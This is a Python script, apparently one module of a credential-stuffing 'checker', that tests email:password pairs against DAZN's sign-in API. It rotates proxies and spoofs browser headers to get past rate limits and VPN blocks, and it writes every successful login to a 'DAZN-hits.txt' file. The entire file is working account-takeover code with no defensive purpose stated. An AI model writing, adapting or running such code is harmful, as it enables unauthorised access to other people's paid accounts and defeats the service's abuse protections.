import bs4
import functools

from requests import Session
from requests.adapters import HTTPAdapter, Retry
from Checker import *
from proxies import *

def DAZN_Check(email:str,password:str):
    while True:
        try:
            with Session() as s:
                proxy = set_proxy()
                proxy_set = set_proxy(proxy)
                
                s.request = functools.partial(s.request, timeout=Checker.timeout)
                s.proxies.update(proxy_set)
                retries = Retry(total=Checker.retries, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))
                
                login_page = s.get('https://www.dazn.com/en-EN/signin')
                login_page_html = bs4.BeautifulSoup(login_page.text, 'html.parser')
                
                #Login
                payload = {
                    "Email": email,
                    "Password": password,
                    "Platform": "web",
                    "DeviceId":"0049A8939B"
                }
                
                headers = {
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Cache-Control": "no-cache",
                    "Content-Type": "application/json",
                    "DNT": "1",
                    "Host": "authentication-prod.ar.indazn.com",
                    "Origin": "https://www.dazn.com",
                    "Referer": "https://www.dazn.com/",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "cross-site",
                    "Sec-GPC": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0 signin/4.18.4.5 hyper/0.8.4 (web; production; es)",
                    "X-DAZN-UA": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0 signin/4.18.4.5 hyper/0.8.4 (web; production; es)"
                }
                
                login = s.post('https://authentication-prod.ar.indazn.com/v5/SignIn', json=payload, headers=headers)
                #print(login.text)
                
                if "{\"Result\":\"SignedIn" in login.text:
                    print('++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++')
                    print('DAZN - HIT: ' + email + ':' + password)
                    print('++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++')
                    filee = open('DAZN-hits.txt', 'a')
                    filee.write(email + ':' + password + '\n')
                    return_proxy(proxy)
                    return
                elif "{\"odata.error\":{\"code\":10049,\"message\":{\"lang\":\"en-US\",\"value\":\"InvalidPassword\"}}}" in login.text:
                    print('----------------------------------------------------------------------------------')
                    print('InvalidPassword: ' + email + ':' + password)
                    print('----------------------------------------------------------------------------------')
                    return_proxy(proxy)
                    return
                elif "Request limiting policy has been breached"  in login.text:
                    print('Request limiting policy has been breached: ' + email + ':' + password)
                    bad_proxy(proxy)
                    return_proxy(proxy)
                elif "DAZN isn't available via VPN." in login.text:
                    print("DAZN isn't available via VPN" + ': ' + proxy)
                    bad_proxy(proxy)
                    return_proxy(proxy)
                else:
                    print('BANNED: ' + email + ':' + password)
                    print(login.text)
                    bad_proxy(proxy)
                    return_proxy(proxy)
        except Exception as e:
            bad_proxy(proxy)
            return_proxy(proxy)
            #print(e)
            print('BAD PROXY: '+ proxy)